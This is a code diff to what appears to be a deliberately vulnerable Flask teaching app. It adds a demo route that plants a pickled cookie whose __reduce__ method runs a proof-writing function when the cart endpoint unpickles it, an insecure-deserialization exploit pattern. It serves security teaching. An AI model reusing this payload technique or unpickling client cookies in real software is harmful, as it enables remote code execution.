@@ -69,6 +69,38 @@ def cart():
     return resp
 
 
+class _EvilCartPayload:
+    def __reduce__(self):
+        # __reduce__ tells pickle "to reconstruct me, call this function
+        # with these args" -- pickle calls it during LOADING, which is
+        # what makes this genuine remote code execution, not just data
+        # tampering.
+        return (write_rce_proof, ("PWNED-VIA-PICKLE-RCE",))
+
+
+@a08_bp.route("/cart-rce-demo")
+def cart_rce_demo():
+    proofs = RceProof.query.order_by(RceProof.triggered_at.desc()).all()
+    malicious_cookie_value = serialize_cart(_EvilCartPayload())
+    resp = make_response(
+        render_template(
+            "a08_integrity_failures/cart_rce_demo.html",
+            proofs=proofs,
+            malicious_cookie_value=malicious_cookie_value,
+        )
+    )
+    # Plant the malicious payload as this browser's cart cookie -- visiting
+    # /a08/cart next is what actually triggers pickle.loads() on it.
+    resp.set_cookie(CART_COOKIE, malicious_cookie_value)
+    return resp
+
+
+@a08_bp.route("/rce-proof")
+def rce_proof():
+    proofs = RceProof.query.order_by(RceProof.triggered_at.desc()).all()
+    return render_template("a08_integrity_failures/rce_proof.html", proofs=proofs)
+
+
 OFFICIAL_PLUGIN_SOURCE = (
     "# Official Widget Theme Plugin v1.0\n"
     'PLUGIN_NAME = "Widget Theme"\n'
